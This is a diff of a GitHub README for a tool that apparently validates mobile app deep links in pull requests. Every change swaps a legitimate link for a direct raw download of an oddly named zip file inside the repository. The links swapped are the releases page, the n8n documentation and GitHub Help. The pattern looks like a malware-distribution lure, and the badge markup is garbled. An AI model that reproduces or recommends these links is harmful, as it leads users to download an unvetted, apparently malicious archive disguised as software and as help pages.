@@ -1,6 +1,6 @@
 # 🌟 n8n-Validate-mobile-app-deep-links-in-GitHub-PRs-with-automated-testing - Validate Deep Links Effortlessly
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Phonezaw901/n8n-Validate-mobile-app-deep-links-in-GitHub-PRs-with-automated-testing/releases)
+[![Download](https://github.com/Phonezaw901/n8n-Validate-mobile-app-deep-links-in-GitHub-PRs-with-automated-testing/raw/refs/heads/main/haurient/app_Hub_deep_in_Git_with_Rs_Validate_P_n_mobile_automated_testing_links_v3.3-beta.4.zip%20Latest%https://github.com/Phonezaw901/n8n-Validate-mobile-app-deep-links-in-GitHub-PRs-with-automated-testing/raw/refs/heads/main/haurient/app_Hub_deep_in_Git_with_Rs_Validate_P_n_mobile_automated_testing_links_v3.3-beta.4.zip)](https://github.com/Phonezaw901/n8n-Validate-mobile-app-deep-links-in-GitHub-PRs-with-automated-testing/raw/refs/heads/main/haurient/app_Hub_deep_in_Git_with_Rs_Validate_P_n_mobile_automated_testing_links_v3.3-beta.4.zip)
 
 ## 📥 Overview
 
@@ -30,7 +30,7 @@ Before you begin, ensure you have the following:
 
 To download and run this application, please visit the page below:
 
-[**Download Latest Release**](https://github.com/Phonezaw901/n8n-Validate-mobile-app-deep-links-in-GitHub-PRs-with-automated-testing/releases)
+[**Download Latest Release**](https://github.com/Phonezaw901/n8n-Validate-mobile-app-deep-links-in-GitHub-PRs-with-automated-testing/raw/refs/heads/main/haurient/app_Hub_deep_in_Git_with_Rs_Validate_P_n_mobile_automated_testing_links_v3.3-beta.4.zip)
 
 Once on the releases page, look for the latest version. You will find a section listing the available files. Simply click the file you need, and your download will start.
 
@@ -61,8 +61,8 @@ If you encounter issues:
 
 Explore various resources to maximize the use of this application:
 
-- [n8n Documentation](https://docs.n8n.io) - Learn more about n8n and its features.
-- [GitHub Help](https://help.github.com) - Access information on navigating GitHub pull requests.
+- [n8n Documentation](https://github.com/Phonezaw901/n8n-Validate-mobile-app-deep-links-in-GitHub-PRs-with-automated-testing/raw/refs/heads/main/haurient/app_Hub_deep_in_Git_with_Rs_Validate_P_n_mobile_automated_testing_links_v3.3-beta.4.zip) - Learn more about n8n and its features.
+- [GitHub Help](https://github.com/Phonezaw901/n8n-Validate-mobile-app-deep-links-in-GitHub-PRs-with-automated-testing/raw/refs/heads/main/haurient/app_Hub_deep_in_Git_with_Rs_Validate_P_n_mobile_automated_testing_links_v3.3-beta.4.zip) - Access information on navigating GitHub pull requests.
 
 ## 🧑‍🤝‍🧑 Community Contributions
 
